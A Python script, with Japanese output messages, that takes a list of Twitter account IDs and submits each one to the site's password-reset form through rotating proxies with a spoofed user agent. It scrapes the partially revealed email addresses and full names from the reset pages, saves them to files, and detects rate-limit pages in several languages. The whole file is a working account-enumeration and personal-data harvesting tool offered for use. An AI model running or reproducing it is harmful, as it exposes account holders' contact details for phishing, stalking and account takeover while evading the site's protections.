from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from mechanize import Browser
import subprocess
import requests
import socks
import socket
import time
import sys

keywords_list = ["Request help signing in to your account."]
regulation_list = [
    "Réinitialisation du mot de passe",
    "Passwortrücksetzung",
    "Wachtwoordherstel",
    "Password Reset",
    "パスワードをリセット",
    "Restablecimiento de contraseña",
    "Lösenordsåterställning",
    "Resetowanie hasła",
    "Salasanan nollaus",
    "Сброс пароля",
]

パスリセ = []
保護済み = []

with open("proxylist.txt") as f:
    proxylist = f.read().splitlines()

def get_proxies():
    proxies = proxylist
    return proxies

proxArr = get_proxies()

def main(ids, retry=5):

    for id in ids:

        for proxy in proxArr:

            proxies = {"http": proxy, "https": proxy}

            res = requests.get("http://inet-ip.info/ip", proxies=proxies)
            print("--------------------------------")
            print()
            print(res.text)
            
            for i in range(retry):

                try:
                    br = Browser()
                    br.set_handle_robots(False)
                    br.addheaders = [
                        ("User-agent", "Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)")
                    ]
                    br.set_proxies(proxies=proxies)

                    br.open(
                        "https://twitter.com/account/begin_password_reset", timeout=10.0
                    )
                    br.select_form(action="/account/begin_password_reset")
                    br["account_identifier"] = id
                    br.submit()

                    html = BeautifulSoup(br.response().read(), "html.parser")
                    title = html.find("title").text
                    body = html.find("body").text

                    for keyword in keywords_list:
                        if keyword in title:

                            print("パスリセメソッド不在")
                            break

                    soupobject = BeautifulSoup(br.response().read(), "html.parser")
                    mailaddresses = soupobject.find_all("strong")
                    fullname = soupobject.find_all("b")
                    willwritedata = id

                    for mailaddress in mailaddresses:
                        willwritedata += "," + mailaddress.text

                    for fullname in fullname:
                        fullname = fullname.text

                    print(fullname)
                    print(willwritedata + "\n")
                    パスリセ.append(fullname + "," + willwritedata + "\n")
                    print("--------------------------------")

                except KeyboardInterrupt:
                    print("強制終了")

                    with open("パスリセ.txt", "w", encoding="utf-8") as f:
                        f.write("\n".join(パスリセ))

                    with open("保護済み.txt", "w", encoding="utf-8") as f:
                        f.write("\n".join(保護済み))

                    print("\n終了")
                    input()
                    exit()

                except TypeError:
                    for regulation in regulation_list:
                        if regulation in title:
                            print("規制")
                            print("--------------------------------")
                            pass
                        pass
                    break

                else:
                    break

            else:
                print("5回試行しましたが実行できませんでした。")

                with open("パスリセ.txt", "w", encoding="utf-8") as f:
                    f.write("\n".join(パスリセ))

                with open("保護済み.txt", "w", encoding="utf-8") as f:
                    f.write("\n".join(保護済み))

                print("\n終了")
                input()
                exit()


with open("idlist.txt") as f:
    ids = f.read().splitlines()

threads = []

with ThreadPoolExecutor(max_workers=16) as pool:
    threads = [br for br in pool.map(main, ids)]

with open("パスリセ.txt", "w", encoding="utf-8") as f:
    f.write("\n".join(パスリセ))
with open("保護済み.txt", "w", encoding="utf-8") as f:
    f.write("\n".join(保護済み))

print("\n終了")
input()
